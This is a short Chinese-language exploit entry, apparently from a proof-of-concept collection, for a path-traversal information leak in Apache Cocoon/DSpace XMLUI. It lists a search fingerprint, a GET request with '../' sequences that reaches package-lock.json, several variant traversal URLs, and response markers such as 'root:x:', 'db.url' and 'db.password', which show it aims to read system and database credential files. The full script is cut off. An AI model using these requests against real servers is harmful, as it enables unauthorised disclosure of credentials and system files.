# ApacheCocoon存在静态文件信息泄露漏洞

- **系统**：ApacheCocoon　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="apache-cocoon"`
- **请求**：`GET /xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=B0585B89D4E135D6E4B7CA9CA3044CA6`　`Host: 127.0.0.1`

**请求体 / payload**
```
**其他URL路径：**
[http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json"](http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json%22)
[http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../../package-lock.json"](http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../../package-lock.json%22)
[http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../../../package-lock.json"](http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../../../../package-lock.json%22)
[http://127.0.0.1/xmlui/themes/Mirage2/images/UCrea/pc/../../.…（脚本共 3110 字，完整版见原文）
```
- **预期**：200　|　lockfileVersion
<project
<?xml
root:x:
dspace.dir
db.url
db.password